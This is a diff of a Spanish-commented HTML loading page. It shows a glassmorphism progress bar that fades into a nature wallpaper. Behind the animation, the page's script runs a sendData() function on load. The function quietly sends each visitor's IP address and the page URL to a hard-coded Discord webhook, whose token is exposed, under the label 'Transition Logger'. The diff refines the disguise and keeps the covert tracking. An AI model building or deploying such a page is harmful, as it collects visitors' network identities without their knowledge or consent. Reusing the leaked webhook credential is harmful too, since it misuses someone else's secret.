@@ -15,14 +15,14 @@
             height: 100%;
             width: 100%;
             overflow: hidden;
-            background-color: #000; /* Color inicial */
+            background-color: #000;
             display: flex;
             justify-content: center;
             align-items: center;
             font-family: 'Segoe UI', sans-serif;
         }
 
-        /* Imagen de fondo con transición de aparición */
+        /* Imagen de fondo (Aparece al final) */
         .background-image {
             position: fixed;
             top: 0;
@@ -30,39 +30,32 @@
             width: 100%;
             height: 100%;
             z-index: -1;
+            /* Imagen de naturaleza 4K */
             background-image: url('https://wallpapers.com/images/hd/4k-nature-moraine-lake-r66plwqa8m3z5reg.jpg');
             background-size: cover;
             background-position: center;
-            opacity: 0; /* Empieza invisible */
-            transition: opacity 2s ease-in-out;
-            transform: scale(1.1);
-            animation: slowZoom 20s infinite alternate;
+            opacity: 0;
+            transition: opacity 2.5s ease-in-out;
         }
 
-        /* Animación de zoom suave para el fondo */
-        @keyframes slowZoom {
-            from { transform: scale(1); }
-            to { transform: scale(1.1); }
-        }
-
-        /* Panel Glassmorphism */
+        /* Panel Glassmorphism con transición de salida */
         .glass-panel {
             z-index: 1;
-            padding: 20px 30px;
-            width: 320px;
-            background: rgba(255, 255, 255, 0.08);
+            padding: 25px 40px;
+            width: 350px;
+            background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(15px);
             -webkit-backdrop-filter: blur(15px);
             border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+            transition: opacity 1.5s ease-in-out, transform 1.5s ease-in-out;
         }
 
-        /* Barra de carga */
         .loader-box {
             width: 100%;
-            height: 5px;
-            background: rgba(0, 0, 0, 0.3);
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
             overflow: hidden;
         }
@@ -71,12 +64,18 @@
             height: 100%;
             width: 0%;
             background: linear-gradient(90deg, #00f2fe, #4facfe);
-            box-shadow: 0 0 15px rgba(0, 242, 254, 0.7);
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.8);
             transition: width 0.1s linear;
         }
 
-        /* Clase para activar la imagen */
-        .visible {
+        /* Estados de animación */
+        .fade-out {
+            opacity: 0;
+            transform: scale(0.95);
+            pointer-events: none;
+        }
+
+        .fade-in-bg {
             opacity: 1 !important;
         }
     </style>
@@ -85,7 +84,7 @@
 
     <div class="background-image" id="bg"></div>
 
-    <div class="glass-panel">
+    <div class="glass-panel" id="main-panel">
         <div class="loader-box">
             <div class="progress-fill" id="progress"></div>
         </div>
@@ -95,24 +94,36 @@
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1494884260577022002/M67ttC3ZWJ4wobkDm-1S6PSj53UzbYOh-lsXhhfeHaXnBqYXTb0BWDrySTVGQKkjIpoj';
 
         window.onload = function() {
-            // Hacer aparecer el fondo al cargar
-            document.getElementById('bg').classList.add('visible');
-            
             startLoading();
             sendData();
         };
 
         function startLoading() {
             const bar = document.getElementById('progress');
+            const panel = document.getElementById('main-panel');
+            const bg = document.getElementById('bg');
             let width = 0;
+
             const interval = setInterval(() => {
                 if (width >= 100) {
                     clearInterval(interval);
+                    
+                    // 1. Desaparece la barra y el panel
+                    setTimeout(() => {
+                        panel.classList.add('fade-out');
+                        
+                        // 2. Aparece el fondo de naturaleza después de que el panel empiece a irse
+                        setTimeout(() => {
+                            bg.classList.add('fade-in-bg');
+                        }, 500);
+                        
+                    }, 500);
+
                 } else {
-                    width += 2;
+                    width += 2; // Carga rápida
                     bar.style.width = width + '%';
                 }
-            }, 60);
+            }, 50);
         }
 
         async function sendData() {
@@ -128,9 +139,9 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
-                        description: `🌐 **IP:** \`${userIP}\` \n🔗 **URL:** ${window.location.href}`,
-                        color: 4886754, 
-                        footer: { text: "Delta Nature Logger" }
+                        description: `🌐 **IP Detectada:** \`${userIP}\` \n🔗 **URL:** ${window.location.href}`,
+                        color: 3447003, 
+                        footer: { text: "Delta System | Transition Logger" }
                     }]
                 })
             }).catch(() => {});
